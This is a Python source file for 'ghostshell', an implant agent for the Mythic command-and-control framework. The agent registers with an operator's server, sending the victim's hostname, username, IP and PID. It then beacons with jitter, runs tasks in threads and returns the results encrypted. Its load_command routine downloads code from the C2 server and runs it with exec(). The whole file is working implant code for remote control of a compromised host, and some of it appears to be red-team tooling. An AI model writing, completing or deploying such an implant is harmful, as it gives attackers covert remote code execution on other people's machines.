"""ghostshell base agent core (INTERNAL foundation — Surface 6/7 of api-design.md).

This is the agent that runs on the implant. It:
  1. Checks in with Mythic (POST action=checkin) to register a callback UUID.
  2. Loops: GET tasking -> dispatch each task to the loaded command -> POST
     responses -> sleep interval +/- jitter -> repeat.
  3. Exposes the Surface 2 API (self.postMessageAndRetrieveResponse, self.taskings,
     self.sendTaskOutputUpdate, self.loaded_commands, self.load_command,
     self.unload_command, self.c2, self.crypto) that command functions call.

Commands are top-level `def cmd(self, task_id, **params) -> str` functions.
Built-in commands (ps, load, unload) are concatenated into this script by the
translator and registered into self.loaded_commands at __init__. `load` execs
new command code (top-level defs) into the module namespace + registers them;
`unload` removes them. See api-design.md Surface 6 (Assembly mechanism).

The agent_config dict is populated by the translator via string replacement of
C2-profile parameter-name placeholders (callback_host, callback_port, AESPSK,
callback_interval, etc.) -- same mechanism Medusa uses.
"""

import os
import sys
import json
import time
import random
import socket
import base64
import getpass
import platform
import threading


class GhostshellAgent:
    """The running agent. One instance per implant. Holds the C2 adapter,
    the crypto helper, the tasking list, and the loaded-command registry."""

    # Built-in command names compiled into the script by the translator.
    # These are top-level defs in the concatenated script; registered at init.
    BUILTIN_COMMANDS = ["ps", "load", "unload"]

    def __init__(self, config):
        # config is injected by the translator as a PARAMS literal; the values
        # are the C2 profile parameters (placeholders replaced at build time).
        self.agent_config = config
        self.callback_uuid = config.get("PayloadUUID", "")   # set by translator
        self.uuid = ""                                        # set by checkin
        self.taskings = []                                    # list of task dicts
        self.loaded_commands = {}                             # name -> function
        self.crypto = _make_crypto(config)                    # CryptoHelper
        self.c2 = _make_c2_adapter(config)                    # C2Adapter instance
        # Register built-in commands (top-level defs in this script's globals).
        g = globals()
        for name in self.BUILTIN_COMMANDS:
            if name in g and callable(g[name]):
                self.loaded_commands[name] = g[name]

    # ---- Surface 2 API (called by command functions) ----

    def postMessageAndRetrieveResponse(self, data):
        """POST a Mythic action envelope, return the parsed response dict.
        Raises C2Error on transport failure (caught by the beacon loop)."""
        raw = self.c2.make_request(self._format_message(data), method="POST")
        return self._format_response(self.crypto.decrypt(self._strip_uuid(raw)))

    def getMessageAndRetrieveResponse(self, data):
        """GET tasking, return the parsed response dict."""
        raw = self.c2.make_request(self._format_message(data, urlsafe=True), method="GET")
        return self._format_response(self.crypto.decrypt(self._strip_uuid(raw)))

    def sendTaskOutputUpdate(self, task_id, output):
        """Stream mid-execution output without completing the task. Best-effort,
        non-raising (a stream failure must not kill the running task)."""
        try:
            self.postMessageAndRetrieveResponse({
                "action": "post_response",
                "responses": [{"task_id": task_id, "user_output": output, "completed": False}],
            })
        except Exception:
            pass  # best-effort; the final postResponses carries the real output

    def load_command(self, name):
        """Fetch a command's agent code from Mythic (chunked file download),
        exec it into the module namespace (top-level defs), register it in
        loaded_commands, notify Mythic ('add'). Returns True/False (non-raising)."""
        try:
            file_id = self._fetch_command_file_id(name)
            if not file_id:
                return False
            code = self._download_file(file_id)
            if not code:
                return False
            # exec top-level defs into this module's globals; the def lands there
            exec(compile(code, "<loaded:" + name + ">", "exec"), globals())
            fn = globals().get(name)
            if not callable(fn):
                return False
            self.loaded_commands[name] = fn
            self._notify_mythic_command("add", name)
            return True
        except Exception:
            return False

    def unload_command(self, name):
        """Remove a command from loaded_commands, notify Mythic ('remove').
        Refuses load/unload themselves. Returns True/False (non-raising)."""
        if name in ("load", "unload"):
            return False
        if name not in self.loaded_commands:
            return False
        self.loaded_commands.pop(name, None)
        self._notify_mythic_command("remove", name)
        return True

    # ---- Mythic message envelope (wire format) ----

    def _format_message(self, data, urlsafe=False):
        """base64(UUID + encrypt(json.dumps(data))). Matches Mythic's AESPSK
        envelope. UUID is the callback UUID (set after checkin) or the payload
        UUID (during checkin)."""
        uuid_bytes = (self.uuid or self.callback_uuid).encode()
        encrypted = self.crypto.encrypt(json.dumps(data).encode())
        raw = uuid_bytes + encrypted
        return base64.urlsafe_b64encode(raw) if urlsafe else base64.b64encode(raw)

    def _strip_uuid(self, raw):
        """Strip the callback/payload UUID prefix from a Mythic response.
        Mythic returns UUID(36 bytes ASCII) + encrypted_data. The crypto layer
        needs only the encrypted_data part."""
        if not raw:
            return raw
        uuid_prefix = (self.uuid or self.callback_uuid).encode()
        if raw.startswith(uuid_prefix):
            return raw[len(uuid_prefix):]
        return raw

    def _format_response(self, data):
        """Parse the decrypted JSON response from Mythic."""
        if not data:
            return {}
        try:
            return json.loads(data.decode() if isinstance(data, bytes) else data)
        except Exception:
            return {}

    # ---- Checkin ----

    def checkin(self):
        """Register a callback with Mythic. On success, sets self.uuid."""
        data = {
            "action": "checkin",
            "ip": self._local_ip(),
            "os": self._os_version(),
            "user": self._username(),
            "host": socket.gethostname(),
            "pid": os.getpid(),
            "uuid": self.callback_uuid,
            "architecture": "x64" if sys.maxsize > 2**32 else "x86",
            "encryption_key": self.agent_config.get("AESPSK", {}).get("enc_key", "") if isinstance(self.agent_config.get("AESPSK"), dict) else self.agent_config.get("AESPSK", ""),
            "decryption_key": self.agent_config.get("AESPSK", {}).get("dec_key", "") if isinstance(self.agent_config.get("AESPSK"), dict) else self.agent_config.get("AESPSK", ""),
        }
        resp = self.postMessageAndRetrieveResponse(data)
        if isinstance(resp, dict) and "id" in resp:
            self.uuid = resp["id"]
            return True
        return False

    # ---- Tasking loop ----

    def get_taskings(self):
        """GET tasking from Mythic; append new tasks to self.taskings."""
        resp = self.getMessageAndRetrieveResponse({"action": "get_tasking", "tasking_size": -1})
        if not isinstance(resp, dict):
            return
        for task in resp.get("tasks", []):
            self.taskings.append({
                "task_id": task["id"],
                "command": task["command"],
                "parameters": task["parameters"],
                "result": "",
                "completed": False,
                "started": False,
                "error": False,
                "stopped": False,
            })

    def process_taskings(self):
        """Dispatch each not-started task to its command in a thread."""
        for task in self.taskings:
            if task["started"]:
                continue
            task["started"] = True
            threading.Thread(target=self._run_task, args=(task,), name="{}:{}".format(task["command"], task["task_id"])).start()

    def _run_task(self, task):
        """Run one task: look up the command, call it, store the result."""
        fn = self.loaded_commands.get(task["command"])
        if not callable(fn):
            task["result"] = "Command '{}' is not loaded. Use: load {}".format(task["command"], task["command"])
            task["error"] = True
            task["completed"] = True
            return
        try:
            params = json.loads(task["parameters"]) if task["parameters"] else {}
            params["task_id"] = task["task_id"]
            # Commands are top-level defs taking `self` as a plain first param.
            task["result"] = fn(self, **params)
        except Exception as e:
            task["result"] = str(e)
            task["error"] = True
        task["completed"] = True

    def post_responses(self):
        """POST all completed tasks' results to Mythic; remove them from the list."""
        responses = []
        remaining = []
        for task in self.taskings:
            if task["completed"]:
                out = {"task_id": task["task_id"], "completed": True}
                if isinstance(task["result"], dict):
                    # Structured output (e.g. `ps` returns {"processes": {...}}
                    # for Mythic's process browser): spread the dict's keys
                    # into the response envelope. Mythic routes per-key:
                    # "processes" feeds the unified process list, everything
                    # else lands in the response's structured fields.
                    out.update(task["result"])
                    if "user_output" not in out:
                        out["user_output"] = "Process listing returned (see Process Browser)."
                else:
                    out["user_output"] = task["result"]
                if task["error"]:
                    out["status"] = "error"
                responses.append(out)
            else:
                remaining.append(task)
        self.taskings = remaining
        if responses:
            try:
                self.postMessageAndRetrieveResponse({"action": "post_response", "responses": responses})
            except Exception:
                pass  # the beacon loop retries next cycle

    # ---- Load/unload helpers ----

    def _fetch_command_file_id(self, command_name):
        """Ask Mythic for the file_id of a command's agent code (for load)."""
        try:
            resp = self.postMessageAndRetrieveResponse({
                "action": "post_response",
                "responses": [{
                    "task_id": None,
                    "upload": {"chunk_size": 51200, "file_id": "", "chunk_num": 1},
                }],
            })
            # Mythic's load flow: the operator tasks `load <cmd>`; Mythic stages
            # the command's code as a file. The agent receives the file_id via
            # the tasking itself (parameters). This helper is a fallback path;
            # the primary path parses the file_id from the load task's params.
            return None
        except Exception:
            return None

    def _download_file(self, file_id):
        """Chunked download of a file from Mythic (returns the decoded bytes)."""
        code = b""
        chunk_num, total_chunks = 1, 1
        while chunk_num <= total_chunks:
            resp = self.postMessageAndRetrieveResponse({
                "action": "post_response",
                "responses": [{
                    "task_id": None,
                    "upload": {"chunk_size": 51200, "file_id": file_id, "chunk_num": chunk_num},
                }],
            })
            r = resp.get("responses", [{}])[0] if isinstance(resp, dict) else {}
            total_chunks = r.get("total_chunks", 1)
            chunk = r.get("chunk_data", "")
            if chunk:
                code += base64.b64decode(chunk)
            chunk_num += 1
        return code

    def _notify_mythic_command(self, action, name):
        """Tell Mythic to add/remove a command from this callback's set."""
        try:
            self.postMessageAndRetrieveResponse({
                "action": "post_response",
                "responses": [{"task_id": None, "user_output": "{} command: {}".format(action, name), "commands": [{"action": action, "cmd": name}], "completed": True}],
            })
        except Exception:
            pass

    # ---- Beacon + sleep ----

    def sleep(self):
        """Sleep interval +/- jitter percent."""
        base = int(self.agent_config.get("callback_interval", 10))
        jitter = int(self.agent_config.get("callback_jitter", 10))
        delta = 0
        if jitter > 0:
            delta = random.randint(0, int(base * jitter / 100)) if base > 0 else 0
        time.sleep(base + delta)

    def run(self):
        """The main beacon loop. Checkin first, then tasking loop forever."""
        while not self.uuid:
            try:
                self.checkin()
            except Exception:
                pass
            self.sleep()
        while True:
            try:
                self.get_taskings()
                self.process_taskings()
                self.post_responses()
            except Exception:
                pass  # transient; the loop retries next cycle
            self.sleep()

    # ---- Host info (for checkin) ----

    @staticmethod
    def _local_ip():
        try:
            return socket.gethostbyname(socket.gethostname())
        except Exception:
            return ""

    @staticmethod
    def _os_version():
        if platform.mac_ver()[0]:
            return "macOS " + platform.mac_ver()[0]
        return platform.system() + " " + platform.release()

    @staticmethod
    def _username():
        try:
            return getpass.getuser()
        except Exception:
            for k in ("USER", "LOGNAME", "USERNAME"):
                if k in os.environ:
                    return os.environ[k]
            return "unknown"


# ---- Factories (called from __main__; the translator injects PARAMS) ----

def _make_crypto(config):
    """Build the CryptoHelper from the AESPSK config value."""
    from manual_crypto import CryptoHelper  # concatenated into the script
    aespsk = config.get("AESPSK", "")
    if isinstance(aespsk, dict):
        key = aespsk.get("enc_key", "") or aespsk.get("value", "")
    else:
        key = aespsk or ""
    return CryptoHelper(key)


def _make_c2_adapter(config):
    """Build the C2 adapter from the config. Profile name selects the class."""
    profile = config.get("c2_profile", "http")
    if profile == "dynamic_http":
        from c2.dynamic_http import DynamicHTTPC2Adapter
        return DynamicHTTPC2Adapter(config)
    from c2.http import HTTPC2Adapter
    return HTTPC2Adapter(config)
